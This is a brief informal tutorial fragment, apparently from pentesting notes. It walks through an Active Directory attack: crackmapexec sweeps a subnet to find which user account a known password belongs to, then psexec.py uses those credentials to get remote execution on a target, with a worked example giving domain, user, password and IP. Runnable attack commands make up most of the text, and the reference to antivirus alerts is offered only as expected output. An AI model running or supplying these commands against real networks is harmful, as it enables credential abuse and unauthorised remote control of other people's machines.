crackmapexec smb <ip/cidr> -u <user> -d <domain> -p <user password>
in ip/cidr example = 192.168.1.0/24 if you don't understand it

now this will run through our network and find which user has this password and the specify user 

you can choose either choose from 'ssh', 'smb', 'rdp', 'ldap', 'winrm', 'ftp', 'mssql')

after that password confirmation we can now try to attack the user with our information 
using 

psexec.py <domain>/user:<password>@<target ip>

psexec.py nani.org/ligion:Password0@192.168.1.24


Note when performing this attack you will notice an anti virus notification on the target machine

like please turn on anti virus 

I blured some of info in the image which for a privacy but those are already written here 
and doesn't provide too much information about this attack they're expected output when the attack performed well
